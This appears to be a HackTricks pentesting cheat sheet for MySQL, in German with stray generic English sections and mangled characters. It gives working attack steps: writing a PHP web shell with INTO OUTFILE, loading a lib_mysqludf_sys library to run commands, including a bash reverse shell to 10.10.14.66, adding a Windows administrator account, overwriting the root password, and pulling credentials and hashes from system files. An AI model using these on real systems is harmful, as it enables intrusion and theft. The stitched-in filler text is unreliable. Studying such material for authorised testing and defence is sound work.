# 3306 - Pentesting Mysql

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu f√∂rdern**, ist dieser Kongress ein brodelnder Treffpunkt f√ºr Technologie- und Cybersicherheitsfachleute in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## **Grundlegende Informationen**

**MySQL** kann als Open-Source-**Relationales Datenbankmanagementsystem (RDBMS)** beschrieben werden, das kostenlos verf√ºgbar ist. Es arbeitet mit der **Structured Query Language (SQL)** und erm√∂glicht die Verwaltung und Manipulation von Datenbanken.

**Standardport:** 3306
```
3306/tcp open  mysql
```
To connect to a local MySQL server, you can use the following command:

```bash
mysql -u <username> -p
```

Replace `<username>` with the username you want to use to connect to the server. You will be prompted to enter the password for the user.

### **Remote**

To connect to a remote MySQL server, you can use the following command:

```bash
mysql -h <hostname> -P <port> -u <username> -p
```

Replace `<hostname>` with the IP address or hostname of the remote server, `<port>` with the port number on which the MySQL server is running (default is 3306), `<username>` with the username you want to use to connect, and you will be prompted to enter the password for the user.

## **Enumerate**

### **Databases**

To list all the databases on the MySQL server, you can use the following command:

```sql
SHOW DATABASES;
```

### **Tables**

To list all the tables in a specific database, you can use the following command:

```sql
USE <database_name>;
SHOW TABLES;
```

Replace `<database_name>` with the name of the database you want to enumerate.

### **Columns**

To list all the columns in a specific table, you can use the following command:

```sql
USE <database_name>;
SHOW COLUMNS FROM <table_name>;
```

Replace `<database_name>` with the name of the database and `<table_name>` with the name of the table you want to enumerate.

### **Data**

To retrieve data from a specific table, you can use the following command:

```sql
USE <database_name>;
SELECT * FROM <table_name>;
```

Replace `<database_name>` with the name of the database and `<table_name>` with the name of the table from which you want to retrieve data.

## **Exploit**

### **SQL Injection**

SQL injection is a common vulnerability in web applications that use user-supplied input in SQL queries without proper sanitization. By injecting malicious SQL code, an attacker can manipulate the query to perform unauthorized actions or retrieve sensitive information.

To exploit SQL injection in a MySQL database, you need to identify vulnerable input points in the application and craft SQL payloads to manipulate the query. Common techniques include UNION-based attacks, boolean-based attacks, and time-based attacks.

### **Privilege Escalation**

If you have limited privileges on a MySQL server, you can try to escalate your privileges to gain administrative access. Common techniques include exploiting misconfigurations, weak passwords, or vulnerabilities in the MySQL server software.

Once you have administrative access, you can perform actions such as creating new users, modifying permissions, or accessing sensitive data that was previously restricted.

## **Post-Exploitation**

### **Dumping Data**

To dump the contents of a MySQL database, you can use the following command:

```bash
mysqldump -u <username> -p <database_name> > dump.sql
```

Replace `<username>` with the username you used to connect to the MySQL server, `<database_name>` with the name of the database you want to dump, and `dump.sql` with the desired output file.

### **Cracking Hashed Passwords**

If you have access to the MySQL user table, you can try to crack hashed passwords to gain unauthorized access to user accounts. Tools like John the Ripper or Hashcat can be used to perform password cracking attacks.

### **Remote Command Execution**

If you have administrative access to a MySQL server, you can execute arbitrary commands on the underlying operating system. This can be done by creating a user-defined function that allows command execution or by exploiting vulnerabilities in the MySQL server software.

## **Mitigation**

To protect against MySQL server vulnerabilities, consider the following mitigation techniques:

- Sanitize user input to prevent SQL injection attacks.
- Use strong passwords and avoid using default or easily guessable credentials.
- Keep the MySQL server software up to date with the latest security patches.
- Restrict access to the MySQL server to trusted IP addresses or networks.
- Regularly monitor and review MySQL server logs for suspicious activity.
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### Remote

#### Introduction

MySQL is a popular open-source relational database management system (RDBMS) used by many organizations to store and manage their data. As a penetration tester, it is important to understand how to assess the security of MySQL installations and identify potential vulnerabilities.

#### Enumeration

The first step in a MySQL penetration test is to gather information about the target system. This can be done using various enumeration techniques, such as port scanning, banner grabbing, and service fingerprinting.

##### Port Scanning

Port scanning is the process of scanning a range of TCP or UDP ports on a target system to determine which ports are open and listening for incoming connections. This can be done using tools like Nmap.

##### Banner Grabbing

Banner grabbing involves connecting to a service and capturing the banner or initial response sent by the server. This can provide valuable information about the service version and other details that can be used to identify potential vulnerabilities.

##### Service Fingerprinting

Service fingerprinting is the process of identifying the specific service running on a particular port. This can be done using tools like Nmap or by analyzing the responses received from the target system.

#### Exploitation

Once the target system has been enumerated and potential vulnerabilities have been identified, the next step is to exploit these vulnerabilities to gain unauthorized access or perform other malicious activities.

##### Default Credentials

One common vulnerability in MySQL installations is the use of default or weak credentials. Many users fail to change the default username and password, making it easy for an attacker to gain unauthorized access.

##### SQL Injection

SQL injection is a technique that allows an attacker to manipulate the SQL queries executed by a web application. This can be used to bypass authentication mechanisms, extract sensitive information, or even modify the database contents.

##### Remote Code Execution

Remote code execution (RCE) vulnerabilities allow an attacker to execute arbitrary code on the target system. This can be used to gain complete control over the system and perform various malicious activities.

#### Post-Exploitation

After gaining unauthorized access to a MySQL installation, there are several post-exploitation techniques that can be used to further compromise the system or maintain access.

##### Privilege Escalation

Privilege escalation involves gaining higher privileges on the target system than originally obtained. This can be done by exploiting misconfigurations, vulnerabilities, or weaknesses in the system.

##### Data Exfiltration

Data exfiltration involves stealing or extracting sensitive data from the target system. This can be done by querying the database, copying files, or using other techniques to transfer the data to an external location.

##### Persistence

Persistence involves maintaining access to the target system even after the initial compromise. This can be done by creating backdoors, modifying system configurations, or using other techniques to ensure continued access.

#### Conclusion

MySQL is a widely used database management system that can be a target for attackers. By understanding the enumeration, exploitation, and post-exploitation techniques discussed in this chapter, penetration testers can effectively assess the security of MySQL installations and help organizations protect their data.
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## Externe Enumeration

Einige der Enumeration-Aktionen erfordern g√ºltige Anmeldeinformationen.
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#mysql)

### Schreibe beliebige bin√§re Daten
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL-Befehle**
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQL Berechtigungen Enumeration

MySQL-Berechtigungen k√∂nnen verwendet werden, um Informationen √ºber die Zugriffsrechte eines Benutzers auf eine MySQL-Datenbank zu sammeln. Dies kann hilfreich sein, um potenzielle Schwachstellen oder Angriffsvektoren zu identifizieren.

#### SHOW GRANTS

Die `SHOW GRANTS`-Anweisung kann verwendet werden, um die Berechtigungen eines bestimmten Benutzers anzuzeigen. Sie gibt eine Liste der Berechtigungen zur√ºck, die dem Benutzer gew√§hrt wurden.

```sql
SHOW GRANTS FOR 'username'@'localhost';
```

#### INFORMATION_SCHEMA

Die `INFORMATION_SCHEMA`-Datenbank enth√§lt Informationen √ºber die Datenbankstruktur, einschlie√ülich der Berechtigungen. Sie kann verwendet werden, um detaillierte Informationen √ºber die Berechtigungen aller Benutzer in der Datenbank abzurufen.

```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
```

#### mysql.user-Tabelle

Die `mysql.user`-Tabelle enth√§lt Informationen √ºber die Benutzer und deren Berechtigungen. Sie kann verwendet werden, um detaillierte Informationen √ºber die Berechtigungen eines bestimmten Benutzers abzurufen.

```sql
SELECT * FROM mysql.user WHERE User = 'username';
```

#### mysql.db-Tabelle

Die `mysql.db`-Tabelle enth√§lt Informationen √ºber die Datenbanken und die Berechtigungen der Benutzer f√ºr diese Datenbanken. Sie kann verwendet werden, um detaillierte Informationen √ºber die Berechtigungen eines bestimmten Benutzers f√ºr eine bestimmte Datenbank abzurufen.

```sql
SELECT * FROM mysql.db WHERE User = 'username' AND Db = 'database';
```

#### mysql.tables_priv-Tabelle

Die `mysql.tables_priv`-Tabelle enth√§lt Informationen √ºber die Berechtigungen der Benutzer f√ºr bestimmte Tabellen. Sie kann verwendet werden, um detaillierte Informationen √ºber die Berechtigungen eines bestimmten Benutzers f√ºr eine bestimmte Tabelle abzurufen.

```sql
SELECT * FROM mysql.tables_priv WHERE User = 'username' AND Db = 'database' AND Table_name = 'table';
```

Es ist wichtig, die Berechtigungen sorgf√§ltig zu √ºberpr√ºfen, um potenzielle Sicherheitsl√ºcken zu identifizieren und zu beheben.
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
Sie k√∂nnen in der Dokumentation die Bedeutung jeder Berechtigung sehen: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQL File RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## MySQL beliebige Dateilese durch den Client

Tats√§chlich, wenn Sie versuchen, **Daten lokal in eine Tabelle zu laden**, fragt der MySQL- oder MariaDB-Server den **Client, sie zu lesen** und den Inhalt zu senden. **Dann, wenn Sie einen MySQL-Client manipulieren k√∂nnen, um sich mit Ihrem eigenen MySQL-Server zu verbinden, k√∂nnen Sie beliebige Dateien lesen.**\
Bitte beachten Sie, dass dies das Verhalten bei Verwendung von:
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(Anmerkung zum Wort "local")\
Denn ohne das Wort "local" k√∂nnen Sie Folgendes erhalten:
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**Anfangs PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**In diesem Artikel finden Sie eine vollst√§ndige Beschreibung des Angriffs und sogar wie man ihn auf RCE erweitert:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**Hier finden Sie eine √úbersicht √ºber den Angriff:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu f√∂rdern**, ist dieser Kongress ein brodelnder Treffpunkt f√ºr Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql-Benutzer

Es w√§re sehr interessant, wenn mysql als **root** ausgef√ºhrt wird:
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### Gef√§hrliche Einstellungen von mysqld.cnf

In der Konfiguration der MySQL-Dienste werden verschiedene Einstellungen verwendet, um deren Betrieb und Sicherheitsma√ünahmen festzulegen:

- Die **`user`**-Einstellung wird verwendet, um den Benutzer festzulegen, unter dem der MySQL-Dienst ausgef√ºhrt wird.
- **`password`** wird verwendet, um das Passwort f√ºr den MySQL-Benutzer festzulegen.
- **`admin_address`** gibt die IP-Adresse an, die auf der administrativen Netzwerkschnittstelle auf TCP/IP-Verbindungen lauscht.
- Die Variable **`debug`** gibt Auskunft √ºber die aktuellen Debugging-Konfigurationen, einschlie√ülich sensibler Informationen in den Protokollen.
- **`sql_warnings`** steuert, ob Informationszeichenketten f√ºr einzelne INSERT-Anweisungen generiert werden, wenn Warnungen auftreten, einschlie√ülich sensibler Daten in den Protokollen.
- Mit **`secure_file_priv`** wird der Umfang von Datenimport- und Exportoperationen eingeschr√§nkt, um die Sicherheit zu erh√∂hen.


### Privilege-Eskalation
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### Privilege Escalation √ºber eine Bibliothek

Wenn der **MySQL-Server als Root** (oder als anderer privilegierter Benutzer) l√§uft, k√∂nnen Sie ihn dazu bringen, Befehle auszuf√ºhren. Daf√ºr m√ºssen Sie **benutzerdefinierte Funktionen** verwenden. Und um eine benutzerdefinierte Funktion zu erstellen, ben√∂tigen Sie eine **Bibliothek** f√ºr das Betriebssystem, auf dem MySQL l√§uft.

Die sch√§dliche Bibliothek kann in sqlmap und in Metasploit gefunden werden, indem Sie **`locate "*lib_mysqludf_sys*"`** ausf√ºhren. Die **`.so`**-Dateien sind **Linux**-Bibliotheken und die **`.dll`**-Dateien sind diejenigen f√ºr **Windows**. W√§hlen Sie diejenige, die Sie ben√∂tigen.

Wenn Sie diese Bibliotheken **nicht haben**, k√∂nnen Sie entweder **nach ihnen suchen** oder diesen [**Linux C-Code**](https://www.exploit-db.com/exploits/1518) herunterladen und **auf der anf√§lligen Linux-Maschine kompilieren**:
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Jetzt, da Sie die Bibliothek haben, melden Sie sich als privilegierter Benutzer (root?) in Mysql an und befolgen Sie die n√§chsten Schritte:

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### Windows

##### MySQL Enumeration

MySQL ist ein weit verbreitetes relationales Datenbankverwaltungssystem, das auf Windows-Systemen h√§ufig eingesetzt wird. Bei der Pentesting von MySQL-Diensten auf Windows-Plattformen gibt es verschiedene Techniken, die verwendet werden k√∂nnen, um Informationen zu sammeln und Schwachstellen zu identifizieren.

##### Port Scanning

Um MySQL-Dienste auf einem Windows-System zu finden, kann ein Port-Scanner wie Nmap verwendet werden. Der Standardport f√ºr MySQL ist 3306. Ein einfacher Befehl, um nach offenen MySQL-Ports zu suchen, lautet:

```
nmap -p 3306 <Ziel-IP>
```

##### Versionserkennung

Nachdem ein offener MySQL-Port gefunden wurde, kann die Version des MySQL-Servers ermittelt werden. Dies kann mit dem Befehl `mysql --version` erfolgen. Alternativ kann auch ein Skript wie `mysql_version.nse` in Nmap verwendet werden:

```
nmap -p 3306 --script mysql_version <Ziel-IP>
```

##### Anmelden mit Standardanmeldeinformationen

Es ist wichtig, die Standardanmeldeinformationen f√ºr MySQL zu √ºberpr√ºfen, da viele Benutzer diese nicht √§ndern. Die Standardanmeldeinformationen f√ºr MySQL auf Windows sind normalerweise:

- Benutzername: root
- Passwort: leer (kein Passwort)

Um sich mit diesen Standardanmeldeinformationen anzumelden, kann der Befehl `mysql -u root -p` verwendet werden. Wenn das Passwort leer ist, kann einfach die Eingabetaste gedr√ºckt werden.

##### Bruteforce-Angriff

Wenn die Standardanmeldeinformationen nicht funktionieren, kann ein Bruteforce-Angriff durchgef√ºhrt werden, um das Passwort f√ºr den MySQL-Benutzer zu erraten. Es gibt verschiedene Tools, die f√ºr diesen Zweck verwendet werden k√∂nnen, wie z.B. Hydra oder Medusa.

Ein Beispielbefehl f√ºr Hydra lautet:

```
hydra -L <Benutzerliste> -P <Passwortliste> <Ziel-IP> mysql
```

##### Schwachstellenanalyse

Nachdem eine erfolgreiche Anmeldung erfolgt ist, k√∂nnen Schwachstellen im MySQL-Server aufgedeckt werden. Dies kann durch √úberpr√ºfen der MySQL-Version und der installierten Plugins erfolgen. Es gibt auch spezielle Tools wie SQLMap, die f√ºr die Schwachstellenanalyse von MySQL-Diensten verwendet werden k√∂nnen.

##### Datenbankerkundung

Sobald Zugriff auf den MySQL-Server erhalten wurde, k√∂nnen verschiedene Techniken zur Datenbankerkundung verwendet werden. Dies umfasst das Anzeigen der vorhandenen Datenbanken, Tabellen und Spalten, das Ausf√ºhren von SQL-Abfragen und das Extrahieren von Daten.

##### Privilege Escalation

Wenn ein Benutzer mit eingeschr√§nkten Berechtigungen angemeldet ist, kann versucht werden, die Berechtigungen zu eskalieren, um Zugriff auf weitere Datenbanken oder privilegierte Funktionen zu erhalten. Dies kann durch Ausnutzen von Schwachstellen oder durch Manipulation von Benutzerberechtigungen erfolgen.

##### Datenbankdump

Ein Datenbankdump kann verwendet werden, um den gesamten Inhalt einer Datenbank zu extrahieren. Dies kann mit dem Befehl `mysqldump` erfolgen:

```
mysqldump -u <Benutzername> -p <Datenbankname> > dump.sql
```

Der Datenbankdump wird in einer SQL-Datei gespeichert, die dann analysiert oder auf einen anderen Server importiert werden kann.

##### Passwort-Hashes

In einigen F√§llen k√∂nnen Passwort-Hashes in der MySQL-Datenbank gespeichert sein. Diese Hashes k√∂nnen extrahiert und dann mit Tools wie John the Ripper oder Hashcat geknackt werden, um die urspr√ºnglichen Passw√∂rter wiederherzustellen.

##### Sicherheitsl√ºcken

Es ist wichtig, bekannte Sicherheitsl√ºcken in MySQL zu √ºberpr√ºfen und zu √ºberpr√ºfen, ob der verwendete MySQL-Server davon betroffen ist. Dies kann durch √úberpr√ºfen von Sicherheitsbulletins und Exploit-Datenbanken erfolgen.

##### Abschluss

Die Pentesting von MySQL-Diensten auf Windows-Systemen erfordert das Verst√§ndnis verschiedener Techniken zur Enumeration, Anmeldung, Schwachstellenanalyse und Datenbankerkundung. Durch die Anwendung dieser Techniken k√∂nnen Sicherheitsl√ºcken identifiziert und potenzielle Angriffspunkte aufgedeckt werden.
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### Extrahieren von MySQL-Anmeldeinformationen aus Dateien

In _/etc/mysql/debian.cnf_ finden Sie das **Klartext-Passwort** des Benutzers **debian-sys-maint**.
```bash
cat /etc/mysql/debian.cnf
```
Sie k√∂nnen **diese Anmeldeinformationen verwenden, um sich in der MySQL-Datenbank anzumelden**.

In der Datei: _/var/lib/mysql/mysql/user.MYD_ finden Sie **alle Hashes der MySQL-Benutzer** (diejenigen, die Sie aus mysql.user in der Datenbank extrahieren k√∂nnen).

Sie k√∂nnen sie extrahieren, indem Sie Folgendes tun:
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### Aktivieren der Protokollierung

Sie k√∂nnen die Protokollierung von MySQL-Abfragen aktivieren, indem Sie die folgenden Zeilen in der Datei `/etc/mysql/my.cnf` auskommentieren:

![](<../.gitbook/assets/image (277).png>)

### N√ºtzliche Dateien

Konfigurationsdateien

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* Befehlshistorie
* \~/.mysql.history
* Protokolldateien
* connections.log
* update.log
* common.log

## Standard MySQL-Datenbank/Tabellen

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
